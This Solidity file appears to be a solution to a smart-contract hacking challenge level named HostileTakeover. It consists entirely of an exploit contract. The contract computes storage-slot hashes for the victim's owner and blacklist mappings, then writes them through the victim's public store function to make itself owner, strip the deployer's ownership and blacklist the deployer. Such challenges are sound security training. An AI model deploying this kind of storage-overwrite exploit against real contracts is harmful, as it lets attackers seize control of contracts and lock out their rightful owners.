/* Objectives:
1. Remove the contract deployer's "is_owner" status
2. Blacklist the contract deployer
3. Set yourself as an owner */
pragma solidity ^0.4.23;

import "./HostileTakeover.sol";

contract levelFiveAttack {
    HostileTakeover victim;

    constructor(address _victim) public {
        victim = HostileTakeover(_victim);
    }

    event Debug(bytes32 _value);

    //get the current_owner_addr from victim from a block explorer or smt
    function automatedAttack(address current_owner_addr) external returns(bool success) {
        //make this contract a owner in victim (set is_owner[this.address] to one)
        bytes32 key = genKey(0x00, 0x00);
        attack(key, 1);
        //remove current_owner_addr victim owner (set is_owner[current_owner_addr] to zero)
        key = genKey(0x00, bytes32(current_owner_addr));
        attack(key, 0);
        //Blacklist current_owner_addr (is blacklisted[current_owner_addr to one)
        key = genKey(0x01, bytes32(current_owner_addr));
        attack(key, 1);

        return true;
    }

    //0 is the first storage slot. this is where the is_owner mapping sits in the victim contract,
    //1 is the second storage slot. this is where the blacklisted mapping sits.
    //pass the owner addr for second and third parts of the attack
    function genKey(uint8 _idx, bytes32 _key) public view returns(bytes32 key) {
        bytes32 idx = bytes32(_idx);
        if (_key == 0x00) {
            key = keccak256(bytes32(address(this)), idx); //this sets us as the owner
        } else {
            key = keccak256(_key, idx);
        }
        emit Debug(key);
        return key;
    }

    function attack(bytes32 _key, uint8 _value) public returns(bool success) {
        bytes32 value = bytes32(_value);
        victim.store(_key, value);

        return true;
    }



}
